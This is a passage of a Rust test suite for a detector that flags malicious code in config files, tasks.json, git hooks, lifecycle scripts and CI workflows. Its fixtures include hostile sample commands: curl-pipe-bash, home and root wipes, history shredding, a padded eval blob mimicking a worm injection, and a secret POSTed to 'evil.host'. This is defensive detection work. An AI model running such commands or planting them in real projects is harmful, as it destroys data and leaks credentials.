        // Legitimate ESM interop is not obfuscation on its own.
        assert!(!score(
            "import { createRequire } from 'module';\nconst require = createRequire(import.meta.url);\nexport default {};\n",
            Surface::ConfigFile
        )
        .obfuscation);
    }

    #[test]
    fn tasksjson_download_exec_fires_but_publish_does_not() {
        // A folderOpen task that curl|bash's fires; a plain `npm publish` does not.
        assert!(gate(Surface::TasksJson, &score("curl http://x/t | bash", Surface::TasksJson)));
        assert!(!gate(Surface::TasksJson, &score("npm publish --access public", Surface::TasksJson)));
    }

    #[test]
    fn download_exec_download_then_run() {
        assert!(score("curl -o boot.js http://x/b && node boot.js", Surface::LifecycleScript).download_exec);
        // Unrelated download + a build step running a different local file must not fire.
        assert!(!score("curl -o logo.png http://x/l && node build.js", Surface::LifecycleScript).download_exec);
    }
    #[test]
    fn destructive_wipe_detected() {
        assert!(score("rm -rf $HOME/*", Surface::PropagationScript).destructive_wipe);
        assert!(score("shred -uz ~/.bash_history", Surface::GitHook).destructive_wipe);
    }
    #[test]
    fn exfil_staging_double_base64() {
        assert!(is_exfil_staging("eyJhIjoiYiJ9\n==trailing"));
        assert!(!is_exfil_staging("{\"a\":\"b\"}"));
    }

    // --- PaddingInjection (version-independent structural tell) ---
    #[test]
    fn padding_injection_detected_on_code_pad_payload_line() {
        // The PolinRider injection shape: legit code, ~2000 spaces, then an obfuscated blob, all on
        // one physical line. Version-independent — no marker/decoder/seed constant is consulted.
        let pad = " ".repeat(2000);
        let line = format!("export default {{}};{pad}global.o='5-3-168-du';var _$_3317=eval(x);");
        assert!(score(&line, Surface::ConfigFile).padding_injection);
    }

    #[test]
    fn padding_injection_is_version_independent() {
        // A hypothetical FUTURE wave with an all-new version tag and decoder name still trips —
        // the structure, not the constants, is what fires.
        let pad = "\t".repeat(300); // tabs count too
        let line = format!("module.exports={{}};{pad}global.z='5-3-999-zz';var _$_ffff=atob(q);");
        assert!(score(&line, Surface::ConfigFile).padding_injection);
    }

    #[test]
    fn padding_injection_fp_safe_on_minified_and_lockfile_and_wasm() {
        // Minified bundle: no whitespace runs at all.
        let minified = "var a=1;function f(){return a+1};export default{f};".repeat(50);
        assert!(!score(&minified, Surface::ConfigFile).padding_injection);
        // yarn.lock: short lines, integrity hashes — no 200-run.
        let lock = "# yarn lockfile v1\nfoo@^1.0.0:\n  version \"1.0.2\"\n  integrity sha512-abcDEF/1234==\n";
        assert!(!score(lock, Surface::ConfigFile).padding_injection);
        // @rive-app WASM glue: one long base64 token (no interior space run + trailing code).
        let wasm = format!("var w='{}';export default w;", "AGFzbQEAAAABpMDyAL".repeat(400));
        assert!(!score(&wasm, Surface::ConfigFile).padding_injection);
    }

    #[test]
    fn padding_injection_fp_safe_on_padded_markdown_table() {
        // A wide markdown table aligns short cells with a long space pad, then closes the column
        // with `|`. That is `content<200+ pad>|` — the same both-sides shape as an injection, but
        // the byte after the pad is a table delimiter, not an obfuscated payload. Must NOT fire.
        let pad = " ".repeat(600);
        let table =
            format!("| Option{pad}| Effect |\n| **name**?: _string_{pad}| As described above. |\n");
        assert!(!padding_injection(&table));
        assert!(!score(&table, Surface::ConfigFile).padding_injection);
        // The real injection — an obfuscated payload after the pad (not a `|`) — must still fire.
        let inj = format!(
            "export default {{}};{}global.o='5-3-168';var _$_3317=eval(x);",
            " ".repeat(2000)
        );
        assert!(padding_injection(&inj));
    }

    #[test]
    fn padding_injection_needs_content_on_both_sides() {
        // Pure deep indentation (a run with content only AFTER it) is not the injection shape.
        let indented = format!("{}return x;", " ".repeat(400));
        assert!(!score(&indented, Surface::ConfigFile).padding_injection);
        // A trailing alignment pad (content only BEFORE the run, nothing after) is not it either.
        let trailing = format!("const X = 1;{}", " ".repeat(400));
        assert!(!score(&trailing, Surface::ConfigFile).padding_injection);
        // A run just under the 200 threshold does not fire.
        let short = format!("a{}b", " ".repeat(199));
        assert!(!score(&short, Surface::ConfigFile).padding_injection);
    }

    #[test]
    fn gate_padding_injection_fires_as_worm_tell() {
        // The whole point: a padded payload conceals its behavior inside the blob, so `behavioral`
        // is false in the raw text. Padding-injection must fire the gate ON ITS OWN (worm tell) on
        // every auto-run surface — otherwise the concealed-behavior wave slips through.
        assert!(gate(Surface::ConfigFile, &sc(|s| s.padding_injection = true)));
        assert!(gate(Surface::DerivedScript, &sc(|s| s.padding_injection = true)));
        assert!(gate(Surface::LifecycleScript, &sc(|s| s.padding_injection = true)));
        // And end-to-end from real content on a ConfigFile.
        let pad = " ".repeat(2000);
        let cfg = format!("export default {{}};{pad}global.o='5-3-168-du';var _$_3317=eval(x);");
        assert!(gate(Surface::ConfigFile, &score(&cfg, Surface::ConfigFile)));
    }

    // --- gate matrix (Task 6) ---
    fn sc(f: impl Fn(&mut CapabilityScore)) -> CapabilityScore {
        let mut s = CapabilityScore::default();
        f(&mut s);
        s
    }
    #[test]
    fn gate_config_requires_prior_and_behavior() {
        assert!(!gate(Surface::ConfigFile, &sc(|s| s.obfuscation = true)));
        assert!(gate(
            Surface::ConfigFile,
            &sc(|s| {
                s.obfuscation = true;
                s.network_egress = true;
            })
        ));
        assert!(gate(
            Surface::ConfigFile,
            &sc(|s| {
                s.trailing_code = true;
                s.process_spawn = true;
            })
        ));
    }
    #[test]
    fn gate_config_lone_download_exec_or_onchain_does_not_fire() {
        // Spec §7: ConfigFile fires only on (obfuscation OR trailing_code) AND a behavioral
        // capability. A lone download_exec / on_chain_resolve with no prior must NOT fire —
        // that prior is exactly what makes entry files FP-safe (spec §4).
        assert!(!gate(Surface::ConfigFile, &sc(|s| s.download_exec = true)));
        assert!(!gate(Surface::ConfigFile, &sc(|s| s.on_chain_resolve = true)));
        // With a prior present, both still fire (they are behavioral capabilities).
        assert!(gate(
            Surface::ConfigFile,
            &sc(|s| {
                s.trailing_code = true;
                s.download_exec = true;
            })
        ));
    }

    #[test]
    fn gate_lifecycle_requires_concealment_or_worm_tell() {
        // Behavior alone (a lifecycle script that downloads-and-runs) does NOT fire — legit
        // preinstall/postinstall scripts do this. It fires only WITH a concealment prior, or on
        // a self-evident worm tell (git self-propagation, home/root wipe, secret exfil).
        assert!(!gate(Surface::LifecycleScript, &sc(|s| s.download_exec = true)));
        assert!(!gate(Surface::LifecycleScript, &sc(|s| s.process_spawn = true)));
        assert!(gate(Surface::LifecycleScript, &sc(|s| {
            s.obfuscation = true;
            s.download_exec = true;
        })));
        assert!(gate(Surface::LifecycleScript, &sc(|s| s.propagation = true)));
        assert!(gate(Surface::LifecycleScript, &sc(|s| s.destructive_wipe = true)));
    }
    #[test]
    fn gate_propagation_script() {
        assert!(gate(Surface::PropagationScript, &sc(|s| s.propagation = true)));
        assert!(!gate(Surface::PropagationScript, &sc(|s| s.process_spawn = true)));
    }
    #[test]
    fn gate_tasksjson_lone_remote_fetch() {
        // A folderOpen tasks.json that fetches a remote resource with no exec sink must fire —
        // spec §7's TasksJson row includes a lone remote-fetch token, not only download_exec.
        assert!(gate(Surface::TasksJson, &score("curl https://evil/beacon", Surface::TasksJson)));
        // A bare fetch token on a ConfigFile still must NOT fire (unchanged, FP-safe).
        assert!(!gate(Surface::ConfigFile, &score("curl https://evil/beacon", Surface::ConfigFile)));
    }

    #[test]
    fn gate_binary_asset() {
        assert!(gate(Surface::BinaryAsset, &sc(|s| s.magic_mismatch = true)));
    }
    #[test]
    fn gate_git_hook_requires_concealment_or_worm_tell() {
        // Legit hooks (husky) run linters/tests/formatters — they exec. Bare behavior does not
        // fire; concealment+behavior or a self-evident worm tell does.
        assert!(!gate(Surface::GitHook, &sc(|s| s.process_spawn = true)));
        assert!(!gate(Surface::GitHook, &sc(|s| s.download_exec = true)));
        assert!(gate(Surface::GitHook, &sc(|s| {
            s.obfuscation = true;
            s.download_exec = true;
        })));
        assert!(gate(Surface::GitHook, &sc(|s| s.credential_exfil = true)));
    }

    // --- FP redesign: legit automation stays silent; worms still fire ---
    #[test]
    fn legit_ci_workflow_is_silent() {
        // A normal release CI: uses secrets, curls a public API, installs/builds/publishes. No
        // concealment, no worm tell -> must NOT fire (was a Critical FP on langflow, etc.).
        let wf = "name: Release\non: push\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n      - run: uv sync\n      - run: last=$(curl -s https://pypi.org/pypi/pkg/json | jq -r .info.version)\n      - env:\n          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}\n        run: uv build && uv publish\n";
        assert!(!gate(Surface::WorkflowFile, &score(wf, Surface::WorkflowFile)));
    }

    #[test]
    fn legit_install_script_is_silent() {
        // A Docker sandbox setup script: curl|bash to install tooling, apt-cleanup rm -rf.
        let sh = "#!/usr/bin/env bash\nset -euo pipefail\napt-get install -y curl nodejs\ncurl -fsSL https://bun.sh/install | bash\nrm -rf /var/lib/apt/lists/*\ndocker build -t img .\n";
        assert!(!gate(Surface::PropagationScript, &score(sh, Surface::PropagationScript)));
    }

    #[test]
    fn legit_deploy_script_is_silent() {
        // A deploy script that installs docker via curl|sh and runs compose.
        let sh = "#!/bin/bash\nset -e\ncurl -fsSL https://get.docker.com | sh\ndocker-compose --env-file .env.production build\ndocker-compose up -d\n";
        assert!(!gate(Surface::PropagationScript, &score(sh, Surface::PropagationScript)));
    }

    #[test]
    fn workflow_secret_exfil_still_fires() {
        // The genuine attack: a secret POSTed as request DATA to an arbitrary host.
        let wf = "- run: curl -d \"${{ secrets.NPM_TOKEN }}\" https://evil.host/collect\n";
        assert!(score(wf, Surface::WorkflowFile).credential_exfil);
        assert!(gate(Surface::WorkflowFile, &score(wf, Surface::WorkflowFile)));
    }

    #[test]
    fn authenticated_api_call_is_not_exfil() {
        // A legit authenticated API call (secret in an auth HEADER, not the body) is NOT exfil.
        let wf = "- run: curl -H \"Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}\" https://api.github.com/repos\n";
        assert!(!score(wf, Surface::WorkflowFile).credential_exfil);
        assert!(!gate(Surface::WorkflowFile, &score(wf, Surface::WorkflowFile)));
    }

    #[test]
    fn apt_cleanup_rm_is_not_destructive_wipe() {
        // Docker/apt cleanup deletes a subdir, not HOME/root — not a destructive wipe.
        assert!(!score("rm -rf /var/lib/apt/lists/*", Surface::PropagationScript).destructive_wipe);
        assert!(!score("rm -rf ./dist node_modules", Surface::PropagationScript).destructive_wipe);
        // Wiping HOME / root still trips.
        assert!(score("rm -rf $HOME/*", Surface::PropagationScript).destructive_wipe);
        assert!(score("rm -rf /", Surface::PropagationScript).destructive_wipe);
    }
}
